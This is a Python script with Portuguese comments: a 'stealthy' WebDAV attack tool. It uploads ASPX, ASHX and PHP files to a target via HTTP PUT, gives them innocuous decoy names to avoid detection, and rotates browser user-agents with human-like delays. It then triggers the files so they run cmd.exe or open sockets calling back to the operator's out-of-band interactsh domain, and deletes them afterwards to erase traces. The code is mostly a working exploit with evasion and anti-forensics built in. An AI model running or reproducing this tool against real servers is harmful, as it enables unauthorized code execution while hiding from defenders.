import requests
import time
import random
import string
import argparse

# -------------------------------------------------------
# CONFIGURAÇÃO
# -------------------------------------------------------

# User-agents reais de browsers rotacionados a cada requisição
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
]

# Extensões a testar: você passa via argumento, não testa todas de uma vez
EXTENSOES_DISPONIVEIS = ["aspx", "php", "ashx", "txt", "html"]

# -------------------------------------------------------
# FUNÇÕES AUXILIARES
# -------------------------------------------------------

def nome_aleatorio(extensao, tamanho=10):
    """
    Gera um nome de arquivo que parece legítimo.
    Exemplo: 'status_report_kxqzlmnpat.aspx'
    Evita padrões como 'shell', 'test', 'cmd'.
    """
    prefixos = ["status", "report", "update", "check", "health", "log", "config"]
    prefixo = random.choice(prefixos)
    sufixo = ''.join(random.choices(string.ascii_lowercase, k=tamanho))
    return f"{prefixo}_{sufixo}.{extensao}"


def headers_furtivos():
    """
    Monta headers que imitam um browser real.
    Rotaciona o User-Agent a cada chamada.
    """
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
    }


def espera_humana(minimo=8, maximo=25):
    """
    Aguarda um tempo aleatório entre ações.
    Imita o ritmo de um humano navegando, não de um script.
    O intervalo padrão é de 8 a 25 segundos — ajuste conforme necessário.
    """
    segundos = random.uniform(minimo, maximo)
    print(f"  [~] Aguardando {segundos:.1f}s...")
    time.sleep(segundos)


# -------------------------------------------------------
# AÇÕES WEBDAV
# -------------------------------------------------------

def fazer_upload(url_base, nome_arquivo, conteudo):
    """
    Faz o upload do arquivo via HTTP PUT.
    Retorna True se o servidor aceitou (status 200, 201 ou 204).
    """
    url_destino = f"{url_base.rstrip('/')}/{nome_arquivo}"
    try:
        resposta = requests.put(
            url_destino,
            data=conteudo,
            headers=headers_furtivos(),
            timeout=10,
            verify=False  # ignora erros de certificado SSL em labs
        )
        if resposta.status_code in [200, 201, 204]:
            print(f"  [+] Upload aceito: {nome_arquivo} (HTTP {resposta.status_code})")
            return True
        else:
            print(f"  [-] Upload rejeitado: {nome_arquivo} (HTTP {resposta.status_code})")
            return False
    except requests.exceptions.RequestException as e:
        print(f"  [!] Erro de conexão no upload: {e}")
        return False


def disparar_execucao(url_base, nome_arquivo):
    """
    Faz um GET no arquivo para que o servidor execute o código.
    Não esperamos ver output — a confirmação vem via OOB.
    Parece um acesso normal de browser.
    """
    url_destino = f"{url_base.rstrip('/')}/{nome_arquivo}"
    try:
        resposta = requests.get(
            url_destino,
            headers=headers_furtivos(),
            timeout=10,
            verify=False
        )
        print(f"  [~] GET disparado: {nome_arquivo} (HTTP {resposta.status_code})")
    except requests.exceptions.RequestException as e:
        print(f"  [!] Erro ao disparar execução: {e}")


def deletar_arquivo(url_base, nome_arquivo):
    """
    Remove o arquivo do servidor após o teste.
    Limpar rastros é parte do OPSEC.
    """
    url_destino = f"{url_base.rstrip('/')}/{nome_arquivo}"
    try:
        resposta = requests.delete(
            url_destino,
            headers=headers_furtivos(),
            timeout=10,
            verify=False
        )
        if resposta.status_code in [200, 204, 404]:
            print(f"  [+] Arquivo deletado: {nome_arquivo}")
        else:
            print(f"  [!] Não foi possível deletar {nome_arquivo} (HTTP {resposta.status_code})")
    except requests.exceptions.RequestException as e:
        print(f"  [!] Erro ao deletar: {e}")


# -------------------------------------------------------
# PAYLOADS OOB POR LINGUAGEM
# -------------------------------------------------------

def payload_oob(extensao, dominio_oob, identificador):
    """
    Gera um payload mínimo que só faz uma requisição DNS/HTTP
    para o seu servidor OOB (interactsh).
    
    O identificador permite saber qual extensão gerou o callback.
    Exemplo de domínio resultante: aspx-abc123.seu-interactsh.oast.me
    
    Não retorna nada na tela — confirmação é 100% OOB.
    """
    destino = f"{identificador}.{dominio_oob}"

    payloads = {
        "aspx": f"""<%@ Page Language="C#" %>
<%
System.Diagnostics.Process p = new System.Diagnostics.Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.Arguments = "/c ping -n 1 {destino}";
p.StartInfo.UseShellExecute = false;
p.Start();
%>""",

        "php": f"""<?php
$dominio = "{destino}";
$sock = fsockopen($dominio, 80, $errno, $errstr, 5);
if (!$sock) {{ dns_get_record($dominio); }}
?>""",

        "ashx": f"""<%@ WebHandler Language="C#" Class="H" %>
using System.Web;
using System.Diagnostics;
public class H : IHttpHandler {{
    public void ProcessRequest(HttpContext ctx) {{
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c ping -n 1 {destino}";
        p.StartInfo.UseShellExecute = false;
        p.Start();
    }}
    public bool IsReusable {{ get {{ return false; }} }}
}}""",

        # Para extensões que não executam código (.txt, .html),
        # fazemos upload de conteúdo neutro — só confirmamos que o servidor aceita gravação
        "txt": f"health check {identificador}",
        "html": f"<html><body>{identificador}</body></html>",
    }

    return payloads.get(extensao, f"probe {identificador}")


# -------------------------------------------------------
# FLUXO PRINCIPAL
# -------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="Testador WebDAV furtivo com confirmação OOB"
    )
    parser.add_argument("url",
        help="URL base do WebDAV. Ex: http://alvo/webdav")
    parser.add_argument("--oob",
        required=True,
        help="Seu domínio interactsh. Ex: abc123.oast.me")
    parser.add_argument("--ext",
        nargs="+",
        default=["aspx"],
        choices=EXTENSOES_DISPONIVEIS,
        help="Extensões a testar. Ex: --ext aspx php")
    parser.add_argument("--delay-min",
        type=int, default=8,
        help="Tempo mínimo de espera entre ações (segundos)")
    parser.add_argument("--delay-max",
        type=int, default=25,
        help="Tempo máximo de espera entre ações (segundos)")

    args = parser.parse_args()

    print(f"\n[*] Alvo : {args.url}")
    print(f"[*] OOB  : {args.oob}")
    print(f"[*] Exts : {args.ext}")
    print(f"[*] Delay: {args.delay_min}–{args.delay_max}s\n")
    print("[*] Monitorando seu interactsh-client em paralelo...\n")

    for extensao in args.ext:
        print(f"[>] Testando extensão: .{extensao}")

        # Identificador único para correlacionar o callback com a extensão
        identificador = f"{extensao}-{''.join(random.choices(string.ascii_lowercase, k=6))}"
        nome = nome_aleatorio(extensao)
        conteudo = payload_oob(extensao, args.oob, identificador)

        print(f"  [i] Arquivo : {nome}")
        print(f"  [i] ID OOB  : {identificador}")
        print(f"  [i] Aguarde callback em: {identificador}.{args.oob}")

        # Passo 1: upload
        sucesso = fazer_upload(args.url, nome, conteudo)
        if not sucesso:
            print(f"  [-] Pulando .{extensao} — upload falhou\n")
            espera_humana(args.delay_min, args.delay_max)
            continue

        espera_humana(args.delay_min, args.delay_max)

        # Passo 2: disparar execução
        disparar_execucao(args.url, nome)

        espera_humana(args.delay_min, args.delay_max)

        # Passo 3: limpar
        deletar_arquivo(args.url, nome)

        print(f"  [i] Verifique seu interactsh — callback esperado de: {identificador}.{args.oob}\n")
        espera_humana(args.delay_min, args.delay_max)

    print("[*] Teste concluído.")
    print("[*] Correlacione os IDs acima com os callbacks recebidos no interactsh-client.")


if __name__ == "__main__":
    main()
